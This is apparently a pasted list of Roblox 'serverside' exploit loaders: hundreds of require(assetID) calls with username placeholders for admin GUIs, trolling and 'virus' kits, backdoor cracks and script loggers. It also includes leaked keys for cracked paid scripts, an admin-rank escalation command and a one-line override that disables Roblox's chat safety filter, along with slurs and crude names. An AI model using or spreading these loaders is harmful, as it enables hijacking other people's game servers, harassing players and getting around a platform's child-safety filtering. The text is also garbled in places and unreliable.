+require(7203746402).tonk("urnamehere") - Tank AI
+
+require(7215403029).RRT("urnamehere") - Special Forces AI
+
+require(7185228601).load("urnamehere") - Helicopter AI
+
+require(0x1767bf813)("urnamehere") - C4 Weapon
+
+require(7163976217).VK("urnamehere") - Police AI
+
+require(7486656912).Juggernaut("urnamehere") - Juggernaut AI
+
+require(3957090799).load("urnamehere") - Godspeed
+
+require(7414960182).load("urnamehere") - The Dark Entity
+
+require(7437496726).load("urnamehere") - Lucyanna Angel
+
+require(6888054758)(game:GetService("Players")["urnamehere"]) - Gregorian (NO) GUI
+
+require(7411835387) ("VictimNameHere") - The Time Machine
+
+require(7322088685)("urnamehere”) - Immortality Demon
+
+require(6530368992).antilgr() - Anti ScriptLogger/WebhookLogger
+
+require(7276744247):noskids("urnamehere") - Logger Detector
+
+require(7485724079)(65464593) - Dark Skidded Lord
+
+require(7485376670).trussboy("urnamehere") - The Ascensionist
+
+require(7475656586).bscr("urnamehere") - Project Godcat
+
+require(7265631746):SGHR("urnamehere") - Sans_Gboard Hub Remake
+
+require(7064628940).TLX("urnamehere") - Tiger's Lamborghini Type-X
+
+require(7380893117).HSBW("urnamehere") - Hyperskidded Bloodwater Edit
+
+require(7452827346):NEFFEXV2("urnamehere") - Neffex V2
+
+require(7077641377).SSB("urnamehere") - Super Skidded Banisher
+
+require(7103633176)("urnamehere”) - Some Random Tool Pack
+
+require(6526438357).HSC("urnamehere") - Hyper Skidded Cannon XSE
+
+require(7594500378)("urnamehere") - Nightmare
+
+require(7593715162).load("urnamehere") - Calamity V3 (Hub)
+
+require(7593452166).exodim("urnamehere") - Exodim LC
+
+require(7601446307):SDIK("urnamehere") - Studio Immortality King
+
+require(7584808965).ImmortalityLord("urnamehere") - Incubus (Neko Edit)
+
+require(7575478789)["v1.6.1"]("urnamehere") - Hyper Skidded Godcat 1.6.1
+
+require(7141234250).molten("urnamehere") - Molten Banisher
+
+require(tonumber("7564007780")).e(string.reverse(string.reverse("urnamehere"))) - Ultraskidded Glitcher
+
+require(6710125107).mlem("urnamehere") - Mlem’s SS Gui V3 (OP)
+
+require(6655953122).HopeV2iguess("urnamehere") - Hope V2
+
+require(7185139799).bal("urnamehere") - Maddox Ball Script (LOL)
+
+require(7664181817)("urnamehere") - Bloodwater Edit
+
+require(7674895345)("urnamehere") - The Ascensionist
+
+require(7662310890)("urnamehere") - Ultraskidded Amongus
+
+require(7661712858).Load("urnamehere") - Ultraskidded Cannon X
+
+require(7691779364).hi("urnamehere") - Hallowed
+
+require(7701211784).rar("urnamehere") - Another Toolpack Script
+
+require(7580799842).NONAME("urnamehere") - Viewport Bloodwater
+
+require(7710841241).HoneyLCX("urnamehere") - Honey LC Overdrive
+
+require(7705282521).lc("urnamehere") - Shrike LC
+
+require(7146067831).katas({Player = "urnamehere", Skid=true}) - Katasrophe LC
+
+require(7133882046).Soul(string.reverse("urnamehere") - Lost Cannon
+
+require(7722155314)("urnamehere") - Unknown Demon (SD Edit)
+
+require(7703246385).NONAME("urnamehere") - New Viewport Bloodwater
+
+require(7078449501).MOTHERFUCKER("urnamehere") - U?N?K?N?O?W?N
+
+require(7759895257).Load("urnamehere") - Omega Skidded Cannon
+
+require(6526438357).TUSC("urnamehere") - Hyper Skidded Cannon XSE (Newest Version)
+
+require(7781347277)("urnamehere") - Redone Ultraskidded Lord
+
+require(8065511782)("urnamehere") - Descensionist
+
+require(6740182305):myfirstscriptthatcankilllol("urnamehere") - Over powered tool pack
+
+require(7819171999).antilgr() - Anti Logger V10
+
+require(6735691273).BetaAntiSkid() - Antiskid V10
+
+require(7628024907).LoadAdmin("urnamehere") - Anti V13 (Anti Universal V3)
+
+require(0x20c40e721):NekoHub("urnamehere")
+
+
+require(4753224196).load("urnamehere")
+
+
+require(7518778955).ConstraintTools("urnamehere")
+
+
+require(6795333966).enableWeapons("urnamehere")
+
+
+require(7207263079).nekogui("urnamehere")
+
+
+require(5133347890).scrambles("urnamehere")
+
+
+require(6460913193).load("urnamehere")
+
+
+require(6953710832):ToolPack_Gui_by_Sans_Gboard("urnamehere")
+
+
+require(5487274946).GLITCHED("urnamehere")
+
+
+require(5419240318).PraiseSkidGod("urnamehere")
+
+
+require(6525681614).reverser("urnamehere")
+
+
+require(7507987223)("urnamehere","Guns")
+
+
+require(7960756691).load("urnamehere")
+
+
+require(6269838898).load("urnamehere")
+
+
+require(5239955586).Dark("urnamehere")
+
+
+require(4105428725).load("urnamehere")
+
+
+require(5193737424)("urnamehere",false)
+
+
+require(5564800243).fehax("urnamehere")
+
+
+require(5127730212)("urnamehere")
+
+
+require(5673170715).Leak("urnamehere")
+
+
+require(6847914535).Hentai("urnamehere")
+
+
+require(4745872847).load("urnamehere")
+
+
+require(6569468935).load("urnamehere")
+
+
+require(6342893088).load("urnamehere")
+
+
+require(2505714651).fuc("urnamehere","Victm")
+
+
+require(4824650327).Best("urnamehere") key:4CPRK-NM3K3-X6XXQ-RXX86-WXCHW --Anonymous UTG
+
+
+require(4744981474).adrian("urnamehere") --adrian trolling gui
+
+
+naughty n word ss: require(4772620524):nig("nicholast013")
+
+-- its auto update slight_smile
+
+-- Road Roller da script
+
+require(4581300009).xd("nicholast013")
+
+
+require(4763495676):Fire("urnamehere") --Ultimate Trolling SS u/ULTIMATE DIO credit to him
+
+
+require(4761634134):Fire("urnamehere") --Black SS
+
+
+UNDERS utg: require(4276916304):Fire("urnamehere") PASS: DevKey
+
+
+Black man's GUI: require(4746910205):UTG("urnamehere")
+
+
+Utg v3: require(4675430277).Lmao("urnamehere")
+
+
+Nuke: require(4530627975):Fire("urnamehere")
+
+
+Unleak: require(4706570992).load("urnamehere")
+
+Non premium scripts:
+
+Island life utg: require(4588615641):Fire("urnamehere")
+
+
+Aureus hub: require(4679893299):Fire("urnamehere")
+
+
+Drahazar: require(4528687560):LMAFO("yournamehere")
+
+
+Many gui: require(4721164458).copy("urnamehere")
+
+
+Bean GUI: require(4649145907).oCAG("urnamehere")
+
+
+require(4798155942):Fire("urnamehere") felipe in it
+
+
+require(4798150799).Lmao("urnamehere") new utg
+
+
+-- A UPDATED This its NEW file Where u can find premium script if u leak u are ban or demote
+
+Reality orb:require(4780399515).load("urnamehere")
+
+require(4748605382).new("urnamehere") -ruby utg
+
+Anonymous UTG: require(4817568691).Best("urnamehere") key:4CPRK-NM3K3-X6XXQ-RXX86-WXCHW
+
+robio viruses: require(4821018129).Virus("urnamehere")
+
+ro bio injector:require(4821022303).Inject("urnamehere")
+
+require(4748605382).new("urnamehere") --ruby utg
+
+
+require(4722218391).load("urnamehere") -- Infinte Glitcher
+
+
+require(4722146433).load("urnamehere") -- Interstekkar Glitcher
+
+
+require(4721766508):GalaxyGlitcher("urnamehere") -- Cytus Glitcher
+
+
+Pixel Glitcher: require(4178465932).MPG("urnamehere")
+
+
+require(4721735759).load("urnamehere") --Spectrum Glitcher
+
+
+require(4721760220):yes("urnamehere") --AOM Glitcher Edit
+
+
+require(4721789462).noxd("urnamehere") --Reality Glitcher
+
+
+spectrum glitcher wokring: require(2844773931).load("urnamehere")
+
+
+reality orb : require(4780399515).load("urnamehere")
+
+
+require(4809720017).load("urnamehere") --axiom glitcher
+
+
+last add require(4809720017).load("urnamehere") --axiom glitcher
+
+require(4809742472).load("urnamehere") --apectrum
+
+require(4809749920).load("urnamehere") --sapdm
+
+require(4537142940).load("urnamehere")
+
+require(6929171488).loadMap("mango")
+
+require(7569443962).setup("mango")
+
+require(6675792322).sfoth("mango") 
+
+require(3168737443).load("mango")
+
+require(6599453106).load("mango")
+
+require(16991266419)("mango")
+
+require(17110662847).asd("mango")
+
+require(17110631120).asd("mango")
+
+require(17110658137).asd("mango")
+
+require(17110637363).asd("mango")
+
+require(16662863386).kfc("mango")
+
+require(16662858613).load("mango")
+
+require(16662877421).panini("mango")
+
+require(4781260949)("mango")
+
+require(16668889289).asd("mango")
+
+require(16668546367).asd("mango")
+
+require(17110655911).asd("mango")
+
+require(16668637411).asd("mango")
+
+require(12653566767).load("mango")
+
+require(17110698446).asd("mango")
+
+require(16668880727).load("mango")
+
+require(16668899769).load("mango")
+
+require(16668946128).asd("mango") 
+
+require(17102919719).map("mango")
+
+require(17871796694).map()
+
+require(17825574180).map()
+
+require(5225767191).load("Ghanimjimin") require(5225767191).load("Ghanimjimin") require(8946786542).load("Ghanimjimin") require(8226150094).load("Ghanimjimin") require(9134953766).load("Ghanimjimin") require(10027382472)("Ghanimjimin")
+require(7624679472)("Ghanimjimin")
+require(15554248870).gui("Ghanimjimin")
+require(15575178966).GUI("Ghanimjimin")
+require(15575178966).GUI("Ghanimjimin")
+require(15492639454).wellbefine("Ghanimjimin")
+require(14730678075):TH('axolote944')
+require(0x3a61a8748).Hackware('ErrorMalbolge', 'Hub')
+require(10137339218)("kiwdfkjwefwe")
+require(16953346597).omer1234("xxxomer12345678") require(17187253685).omerv3("xxxomer12345678") require(16852821798).omerkidd("xxxomer12345678")
+require(6891579660).LoadAdmin("RobloxSupp515")
+require(0X44BC8386DB49).Gooby("username")
+require(13049797927).varafed("username")  require(0x408e54f7c).ServerSideV101FirstVersion('TYforbuyingGroveSS')
+require(11933861084).load("username") c00lkidd admin v5
+require(9896417368).load("username") 'private' executor
+require(12152005848)("username") project ligma
+require(11988216523).load("username") zetra79
+require(12491997136)("fluxusguy1234") rc7
+require(13641624112):tus("username") sugma / stigma edit
+require(13326771513).TUBERSGUI("username") tubers93 gui
+require(11940052675).load("username") k00padmin
+require(10028265342)("username") anonymous gui
+require(11983144110)("username") edited bytegui
+require(12897516284):pls("username") verified exser edit
+require(13718034160):pls("LuaGunsX") ANOTHER ONE
+require(11504840911).load("username") display hub
+require(11721506491)("username") adren gui
+require(9036221508).load("username") c00lgui edit v2
+require(9497518303).BYTEGUIKYXLES("username") another bytegui edit ig?
+require(11611459969).load("username") k00pgui revamp
+require(13021554242).Cl00vin("username") secret hub
+require(13045816634)("username") c00lboi admin
+require(13464268783).k00pzbackdoor("username") backdoor k00pgui
+require(16528756174).epic("this gui is working")Dragostar v5 require(0x391c103dd).load("user")
+require(9812006079):Immortal("user")
+require(13944915491).item_asylum("user")
+require(15622251265).ttkdd("user")
+require(0x398524b58).w("user")
+require(12621812058).yeskido("urname")
+require(13924408521).TeamFatGUI("user") code is  temfatguiv15eas7require(0x301fe09f1).load("YourNameHere")
+require(0x3b7ccaefc):buttongui("DataHaxx")
+require(12796454422).lek("Username")
+require(14940901622).v18("YouName")
+require(15878083444)("USERNAME")
+require(14484724289).horror()
+require(12102103065).Patrick("username")
+require(0x727c7041e/2/60x6).Magic("username")
+require(14524435542).nyancaty("")require(15054201909).g00g("userskid")
+require(13772265165).TeamFatGUICrackedByLua("fluxusguy1234") password:A BEAMED BY MEMEZ TROJAN HACKERZ
+require(5152175374).BIGBEN("GERSIVALDO")
+require(4893505230).batatagui("chadow100")
+require(4724549943).load("chadow100")
+require(5001982403).undetected("iam_inhadible")
+require(4893505230).batatagui("chadow100")
+require(5101422709).ZXCVBNM("chadow100")
+require(5170479777).smile("A_MilkyWay")
+require(4857508756).noblgui("GERSIVALDO")
+require(5173040583).load("A_MilkyWay")
+require(6858594080).KrnKidsSus("name")
+require(16422687248).JO1TAR0utg("JO1TAR0")--replace JO1TAR0 with ur name
+require(15352544502).guiz("pcftd")
+k00p by edit jo1tar0
+require(15300198959).v3secret("tarrabahka") 
+require(15196817849).MW("666_O23")
+t00t gui require(15648297044).hi("urname")
+require(15237897946).RAroblox("YourNameHere")
+require(16502154303)("YourNameHere")
+require(16453916639).RAroblox("YourNameHere")
+require(16003989257).RAroblox("YourNameHere")
+require(16302109607).RAroblox("YourNameHere")
+require(14840517635).RAroblox("YourNameHere")
+require(14883437235).load("XyzerSup")
+require(16198803917).RAroblox("YourNameHere")
+require(16210142697).RAroblox("YourNameHere")
+require(12102103065).Patrick("justanormalcatr")
+require(13326771513).TUBERSGUI("justanormalcatr")
+-- Omg Last Star So Rar!
+require(7327437424).OMG("Username")
+require(16202829283).thiswasupdated3times("fluxusguy1234")
+require(4908879071).load("Doritosman2437") not a skid script but enjoy ig
+Here 1. require(12599435703)('Username') Cr antideath 2. require(7781347277)("name") ultra funny lord (ultra skidded guy)
+require(16167936142).RAroblox("YourNameHere")
+require(11822002067).Lmao()
+require(9275293020).load("justanormalcatr")
+
+
+
+require(5028947792).Lmao("justanormalcatr")
+
+
+
+require(11943725953)('justanormalcatr')
+
+
+
+require(11943725953)('justanormalcatr')
+
+
+
+require(5089018959):Glitch("justanormalcatr")
+
+
+require(8913865946).frakture("justanormalcatr")
+
+
+require(13326771513).TUBERSGUI("justanormalcatr")
+
+
+
+require(12102103065).Patrick("justanormalcatr")
+require(13398544497):TH('baconkingloler9') 
+
+Tophat
+require(10632163881).SlapBattleKits("fluxusguy1234")
+require(6099977149).load("justanormalcatr")
+teamfatguiv19easter
+require(16004144320)("YourNameHere")
+require(15712067929)()
+require(15947970857)("YourNameHere")
+require(16004029487).RAroblox("YourNameHere")
+require(12898696957)("YourNameHere")
+require(15676237697)("YourNameHere")
+require(14021031434)("YourNameHere")
+require(15873073477).RAroblox("YourNameHere")
+require(5352721272):Fire("YOUR NAME RAT")
+require(6665978670).Loser("your name")
+require(15769555206).RAroblox("YourNameHere")
+require(15721914137).RAroblox("YourNameHere")
+require(14319533395).TV("name") titan tv man require(13153051096).fly("name") star glitcher anti death require(12070820190).fnaf1() fnaf map part 3 coming soon
+require(15627085040).RAroblox("YourNameHere")
+Require(14288620360).ohiov2("ceren_el") ohio map require(11882629485)("ceren_el") CR wither storm require(13124687790).Owner("ceren_el") Giygas
+require(15626881693).RAroblox("YourNameHere")
+
+require(15377003842).RAroblox("fluxusguy1234")
+require(15562958794)("YourNameHere")
+require(15436577570).RAroblox("YourNameHere")
+script : require(6146060838)('name')
+require(0x34485aa43).nekohub("YourNameHere")
+require(15348040056)("YourNameHere")
+https://www.youtube.com/watch?v=YUY1qliC96E
+
+Script: require(15324943910).map()
+require(15244529363).RAroblox("YourNameHere")
+require(15317177436).RAroblox("YourNameHere")
+require(15301977553)("YourNameHere")
+require(15207472549).americanfreedom("UNOVERSON") is a m4 rifle (american national anthem plays)
+require(15209527760).deathcontroller("UNOVERSON") death note and control person (to use death note click a player) (control script may not work)
+require(15255250836).A10AIRSUPPORT("UNOVERSON") flyable a10
+require(15255489946).Hornet("UNOVERSON") hornet jet
+require(15261712014).toys("UNOVERSON") toy soldiers
+require(15261931395).map()  moon map
+ 
+require(15262085147).map() warzone map
+require(15263037483).load("UNOVERSON") hk416 with gore
+require(15263182629).map() d day map
+ require(15263147066).bombingrun("UNOVERSON") bombing run
+require(15264425587).emergencyresponders("UNOVERSON") marine ai animated lol (very buggy)
+require (7252112522):XD("Hairisnow")
+require(8639373083):SyntaxBackdoorCrack("Hairisnow")
+require(12180555239).rooms("Hairisnow")
+require(12288951229)("Hairisnow")
+require(6432679165).emotionless("Hairisnow")
+require(12417774819).Real("Hairisnow")
+require(6226546723).load("Hairisnow")
+require(0x22330bb15).Hotladiesinyourarea("Hairisnow")
+require(11675095122)("Hairisnow")
+require(12683295468).engender("Hairisnow")
+require(10868847330):pls("Hairisnow")
+require(7935964098)("Hairisnow")
+require(6526438356).TUSC("Hairisnow")
+require(7192763922).load("Hairisnow")
+require(0x300099b2a)["AnimeHubV3"]("Hairisnow")
+require(5972874843).load("Hairisnow")
+require(11705706269)["DistraughtV2"](game:GetService("Players")["Hairisnow"].UserId)
+require(7163976217).VK("Hairisnow")
+require(11177245029)("Hairisnow")
+require(5972874843).load("Hairisnow")
+require (9878580238).holyshitthisissorarepleasedontfuckingleak("Hairisnow")
+require(8222129769).youareanidiot("")
+require(12933040327)("Hairisnow")
+require(12417774819).Real("Hairisnow")
+require(10632163881).SlapBattleKits("Hairisnow")
+require(5828018389)("Hairisnow")
+require(7951455588):powerful_antilogger("Hairisnow")
+require(0x24C90414E):Funny69("Buildermanwhit","Hairisnow")
+Require(5466852956).eliza("Hairisnow")
+require(5972874843).load("")
+require(13021554242).Cl00vin("Hairisnow")
+require(11487552689):Niko("Hairisnow")
+require(7192763922).load("Hairisnow")
+require(6355915532).load("Hairisnow")
+require(7585502055).load("Hairisnow")
+require(6342893088).load(owner.Name)
+require(7496592494).load(owner.Name)
+require(9489877930).Floppa(owner.Name)
+require(11689554882):Ietahuoy("Hairisnow","17")
+require(8036527046).VESZ("Hairisnow","fire")
+require(6274987259).v2("Hairisnow")
+require(13823738962).u1guiv3("ArmstongHighSchool")
+require(13351082619).p00g("ArmstongHighSchool")
+require(13762507156)("ArmstongHighSchool")
+require(15217315505)("YourNameHere")
+require(15176454945).RAroblox("YourNameHere")
+require(8076509064).CLoad("Username")
+require(15168663562).Strafe("UNOVERSON")
+require(13757548469).load("coolplayer11010")
+require(15142031527).Virus("UNOVERSON") is a plane
+require(15141896082).load("UNOVERSON") is a bunch of gears
+require(15142031527).Virus("UNOVERSON") is a plane
+require(15142937417).map() prison life map
+  require(15143133640).load("UNOVERSON") is a oversized revolver 
+  require(15143061086).load("UNOVERSON") combat system
+require(5321077609).Dark("coolplayer11010")
+require(0x36db59c05).v1("ArmstongHighSchool")
+Password: wcrykidd
+require(0x304d5a83b).poogskid('brithishshkid') funni gui
+require(14749074999).kakaz("your Name kid" )
+require(15153365489).RAroblox("YourNameHere")
+require(14940901622).v18("name")
+require(14981265528)("YourNameHere")
+require(15097139895).LoadMap(true,true,true)
+require(15096051693):LoadMap(true,true,true)
+require(15087290558).Strafe("UNOVERSON")
+require(15086437516).Strafe("UNOVERSON")
+require(15077804586).RRT("UNOVERSON") US Marines (friendly)
+require(15077846652).RRT("UNOVERSON") US Marines (hostile)
+require(15064172215).map()
+require(15027583882)("YourNameHere")
+require(15009493272).map()
+epic obby
+require(15032853073).load("UNOVERSON")
+require(14971215807).RAroblox("YourNameHere")
+require(14883824578).RAroblox("YourNameHere")
+require(14298011197).RAroblox("YourNameHere")
+lua require(0x354a86a25)("BrandiStrong74", Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160), true)
+local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end
+require(5099140412).Aqua("justanormalcatr")
+require(11617156004)()
+require(5352721272):Fire("justanormalcatr")
+require(14829670677).EDITL0L("justanormalcatr")
+require(14775634069)("YourNameHere")
+require(14833072467)("YourNameHere")
+require(14822974119)("YourNameHere")
+require(14694784585)('Yourueername')
+
+
+require(11669791984).SD()
+require(14096093601).RAroblox("YourNameHere")
+require(14166478425).RAroblox("YourNameHere")
+require(14260116557).RAroblox("YourNameHere")
+require(14142248894).RAroblox("YourNameHere")
+require(13904101403).RAroblox("YourNameHere")
+require(13883624765).RAroblox("YourNameHere")
+require(13547884298).RAroblox("YourNameHere")
+require(15232587754).DreamGUI("AkashTheAdmi")
+require(0x36db59c05).v1("user")
+Developerstudio2023
+require(8913865946).frakture("fluxusguy1234")
+16770115923 a spongebob id
+require(10868847330):pls("fluxusguy1234")
+require(14940596979).fat("fluxusguy1234")
+teamfatguiv19easter
+Rail gun Require(387443356).load("Xenarations")
+Spision Burger require(1517565991).load("Xenarations")
+Shotgun require(377131485).load("Xenarations")
+Mc donalds Map require(2280744552):MCDONALDS()
+KFC Map require(1902457710).load("all")
+Controll gui require(2500115789).load("Xenarations")
+Aether admin require(2114966472).heck("Xenarations")
+Desert Dune Buggy require(2379784568)().loads("Xenarations")
+Tactical bfgs Serverside Condo gui require(1368306381).loads("Xenarations")
+Grab Knife v4 require(1193146271).loads("Xenarations")
+Grab knife v3 require(1964136149).loads("Xenarations")
+Grab knife v2 require(1939927688).loads("Xenarations")
+Raining ducks require(966740157).loads("Xenarations")
+Raining men require(966723234).loads("")
+Ace Of Diamonds require(2977016048).load("Xenarations")
+Monk require(2977023028).load("Xenarations")
+Grapple Hooks require(2977044113).load("Xenarations")
+Bomb on require(2977047659).load("Xenarations")
+9/11 require(2977061215).load("Xenarations")
+Death Note require(2977073855).load("Xenarations")
+Control Gui require(2977093983).load("Xenarations")
+world eater require(2978778961).load("Xenarations")
+domino's pizza require(2981059629).load("Xenarations")
+shadow lord require(2984418010).load("Xenarations")
+snup dog require(2984511783).load("Xenarations") 
+Lua Hammer require(2984879655).load("Xenarations")
+pokeballs require(2984911937).load("Xenarations")
+Toad require(2984921335).load("Xenarations")
+Yellow Boy require(2984944208).load("Xenarations")
+spongebobs house require(2984954483).load("Xenarations")
+war machine require(2984976316).load("Xenarations")
+ice giant require(2985009308).load("Xenarations")
+chara require(2985019865).load("Xenarations")
+blackcell GUI require(2985036980).load("Xenarations")
+fords gun require(2985065669).load("Xenarations")
+Thomas The Tank Engine require(2985076062).load("Xenarations")
+troll face require(2985101287).load("Xenarations")
+gaster require (2985155579).load("Xenarations")
+anime super powers require(2985153317).load("Xenarations")
+soul reaper require(2985164979).load("Xenarations")
+sword master require(2985184326).load("Xenarations")
+thunder gun require(2987299148).load("Xenarations")
+sniper require(2987312314).load("Xenarations")
+Blue Sword require(2987331232).load("Xenarations")
+Chara require(2658847146).load'FTOUHICOOL'
+------------------------------------------------------------------ ----------------------------------------
+--------------------------
+------------------------------------------------------------------ Rare modules Section ------------------------------
+------------------------------------
+------------------------------------------------------------------ ----------------------------------------
+--------------------------
+------------------------------------------------------------------ OwO ------------------------------------
+------------------------------
+Red hot banisher: require(3021451890).load("Xenarations")
+Fallen god's daughter : require(03021080013).load("Xenarations")
+Codex fighter: require(3148313559).load("Xenarations")
+Guardian of light: require(3020974806).load("Xenarations")
+Winged Shot: require(2920382269).load"Xenarations"
+Ufo Reap: require(2552620429).load"Xenarations"
+teardrop Guns: require(3043766339).load"Xenarations"
+Syrite vanos: require(2974908082).load("Xenarations")
+Bible's admin: require(2833959389).load"Xenarations"
+Ethernal Glitcher rewited: require(2560732565).ethe("Xenarations")
+Farth's gui: require(3183163217):Fire("FTOUHICOOL")
+mr bye bye [purple Theme] : require(3074454555).mbye("Xenarations")
+UTG: require(2993514878):Fire("Xenarations")
+Sigmabldz admin [May break]: require(2969225161):Fire("Nob","Xenarations)
+Kuro admin: require(2513069802).admin("Xenarations")
+God : require(2658905537).load'FTOUHICOOL'
+require(4829576129).SpringHub("username") -- spring hub (rare) (epicly cracked by cooldude)
+require(4838360731).RainbowHub("username") -- rainbow hub (rare)(epicly cracked by
+cooldude)
+require(4828418260).usg("username") -- USG premuim(paid but epicly cracked)
+require(4900073415).MML("username") -- Fixed mml(you're welcome lol)
+require(4834326960).RC7("username") -- Rc7 (Paid But Epicly Cracker by cooldude) key: bruh
+require(4857508756).noblgui("username") -- non blacklist gui(idfk)
+require(game:GetService("ReplicatedStorage"):WaitForChild("HDAdminSetup")):GetMain()
+:GetModule("cf"):SetRank(game.Players.username, 1, 5, "Perm") -- HD owner
+_G.setPower:Fire("username", 6) -- kohls creator (kohls)
+require(4767686662).Lmao("username") -- i forgot
+require(4834971626).TheLastWayToEndSkids("username") Puffys Cool Club Gui V2 (RARE)
+key: ONLYJOINIFCOOL
+require(4834931816).Rose("username") rosehub ss (RA RE)
+require(4821018129).Virus("username") -- the ro-bio virus kit
+require(4821022303).Inject("username") -- the ro-bio injecter tool (goes with virus kit)
+require(4634558715)("username") -- best hub (RARE has adonis creator script adonis script
+only works when no adonis is in the game) DONT LEAK IK WHO YOU ARE CHILLFRIB
+require(4922204781).WOW("username") -- 18+ gui converted by dirty1234
+ require(4932477844):SnakeVenom("urname") -- snake venom cracked yeah join this to get
+whitelisted: https://web.roblox.com/groups/2625401/St...ub#!/about
+require(4932468518).Boss("username") --boss hub epicccc
+require(4935835439)("ur username","host") -- script logger
+require(4949149864)("username") -- iron man suit (HalF FE)
+require(4962917154).UwU("usernam") -- kaspers UTG (RARE)
+require(4945273678).load("username") -- snake oof
+require(4962812209).load("username") -- hub parody
+require(4937114966):SH("cooldudeash09") -- pink kasper hub
+require(4961201586):Haii("username") -- epic kasper hub ("OP PROBABLY RARE")
+require(4748541998):Admin("username") -- idk lol
+require(g):stfu("username") -- undetected admin
+require(9298330053).load("BlockateABCs") - gohub works
+require(4741673518).load("BlockateABCs") - stratosphere admin works
+require(719276392).load("BlockateABCs") - hd admin gui
+require(6422837518).roxploitv6("BlockateABCs") - roxploit
+require(9377543709).InfectionV2("BlockateABCs") - infection v2
+require(8946786542).load('BlockateABCs') - c00lgui v2
+require(6667830758):WarioWare("username") - warioware crack workz
+require(5390833042)("JinxTheCat_E") - new iy
+require(5822007763).BRUH("username") - random script i got
+require(7329498718):XD("_E") - foldz hub (key: arAimSp26tDU9HddwyGJ) works
+require(9784061985):AD() - soup detection
+require(9258248700):dontleakthispleaze("JinxTheCat_E") - sammy executor
+require(9489877930).Floppa("JinxTheCat_E") - floppa hub v2
+require(8862233337).load("JinxTheCat_E") - sussy ss
+require(6338716711).lol("JinxTheCat_E") - server destruction gui
+require(5275752166).ULTRAV2("ghirgerlel")- ultra hub v2
+require(6112085780).FatalErrorSans("ghirgerlel") 
+require(6115866056).DustInk("ghirgerlel")
+require(6733698616):Immortal("duddjddfitv") pass : oh nooo 
+require(10868847330):pls("duddjddfit_v") gui best
+Key : "c00lkidds"
+require(8639373083):SyntaxBackdoorCrack("duddjddfitv") Syntax SS
+require(7737379602).map()
+require(8626754476):AD()
+require(6735691273).AntiSkid()
+require(11617156004)()
+require(7596870806).antilgr()
+require(11560761226).HD("duddjddfitv")
+require(12159842278).ADMIN("duddjddfitv")
+require(13393840913)()
+require(8979405124)("Guess146370_AltJan3")
+
+require(5160216694).Ass("Guess146370_AltJan3")
+
+require(7192763922).load("Guess146370_AltJan3")
+require(197281001627).k00popv7SKELTONISSUP3RSKIDSSPSKIDDEDBYERR0R("itsnotskeleton")
+
+require(9770836579)("Guess146370_AltJan3")
+
+require(8979405124)("Guess146370_AltJan3")
+
+require(9263079367)("VictimNameHere")
+
+require(6665978670).Loser("Guess146370_AltJan3")
+
+sugma v1 require(11183244198):s('sugma',game.Players.USERNAMEHERE)
+
+UTG
+require(4212392954). CLoad("arteez2013")-- A Gun (Utility Tool) (Very op)
+
+Sigma Ss - require(4982992957)
+
+
+
+Secret Service Panel require (17073274775) ("pfzq")
+Secret Service Panel DEX Version - require (16977144399) ("pfzq")
+Secret Service Administration require(16668858335). skid("pfzq","ssa") Old Secret Service Administration
+roblox")
+require(16668984909).load("pfzq", "1994 d
+Old Secret Service Panel - require (17632411730) {Owners={"pfzq"}, Prefix=';'} Obunga - require (97971729290214)()
+Obuga Citizen One - require(123134147078298)()
+DreamyBull Gui, By Hamad - require(18790530478) ("pfzq") infinitie yield - require(7634392335) ("pfzq")
+Fbi executor - require(18178393297) ("pfzq")
+SS v2 So Cool - require(6405516751).load("RobloxBoy4762") primadon require (17513697824) ("Username")
+AOS Admin - require(16661955141): Fire("pfzq")
+ur bads AOS Admin - require(16771067578): Fire("pfzq")
+Mr Bean admin - require(16638501761) {Owners={"pfzq"}, Prefix=';'} Mcdonalds Admin - require (16668583391) {Owners={"pfzq"}, Prefix='; '} Strato admin - require(6590963180).load("pfzq")
+V3rmillion Admin require (16991153209).load("pfzq")
+MML Admin - require (7573703059). MMLHax("pfzq")
+Fe hax - require(17472456139). fehax("your name")
+Nexus Admin - require(16988699893) ("pfzq")
+Bee Exoliner admin V2 - require (2969225161): Fire("Nob", "pfzq") Intent Admin - require (16988255787): Fire("Intent", "pfzq")
+Frank's Admin - require(16988244323): FranksAdmin ("Frank", "pfzq") Infyield Admin - require(4832971989) ("RobloxBoy4762")
+Moon's Infyield Admin - require (16988709094) ("pfzq") Cooks Infyield Admin - require(16662939551)("pfzq")
+Adonis Admin - require(16662768931):GetAdmin("pfzq", "Hi??")
+Quantom Admin - require(3048207279): Fire("kermitwashere, ok", "pfzq") Rocky2U Admin - require(16662837893). AddRocky("pfzq")
+Bilbert SSrequire(16988766924)("pfzg")
+Rocky2U Admin - require(16662837893).AddRocky("pfzq") Bilbert SS require(16988766924)("pfzq") Loaf Ss - require(6405516751).load("pfzq") Doot Ss - require (16662883722).hii("pfzq") Fire("pfzq") Herobrine - require(17601661042)("pfzq") NI-CISYNIA - require(7324976391).load("pfzq") Cloud - require (5665978099)("pfzq")
+Morph Magic GUI - require(4941950065) ("pfzq") Sugma V1 GUI - require(16669178176) ("pfzq") Manuall Hax GUI require(6712240276). yo("pfzq") Gosh GUI - require(16668835270).load("pfzq") PLUR GUI - require(6280142988). Purl("pfzq") Ark of Hades GUI - require(16988738909)("pfzq") Rocket GUI - require (2513295250).load("pfzq") SS GUI require (2937437253).load("pfzq") UVG GUI - require (6280136701).load("pfzq") JuanaV3 GUI - require(4924065675): Fire("pfzq")
+CoolKidd GUI - require(16991244705): Fire("pfzq", "coolkidd") Bee's SS GUI - require (2670071430).load("pfzq")
+Dex ultimate Debugging Suite - require (16662779782)("pfzq") Classic GUI - require (2930633918).load("pfzq")
+Nilzer V5 GUI - require(7054827484).load("pfzq")
+Utgv1 Abusive guns GUI - require(6447503730) ("pfzq")
+Gun GUI - require (16662820067) ("pfzq", "BEANMANBEANMAN")
+Tubers93 Gun GUI require(6677765693) ("pfzq", "we lovedooter")
+
+‏(4967804765).SBV3("urnamehere") - Snake Banisher V3
+
+‏require(4903995654)(65464593) - Immortality Cannon ( E, Q, R, G, F, T, K, M )
+
+‏require(4992512410):Asylumgotskidded("urnamehere") - Asylum Hub
+
+‏require(6114289913).c00lgui("urnamehere") - c00lgui remake
+
+‏require(5308680571).load("urnamehere") - GUI Hub
+
+‏require(4813227802){"urnamehere"} - PikaX UTG
+
+‏require(0xA8526D5D).giveGuns'urnamehere'- Phantom Forces Guns
+
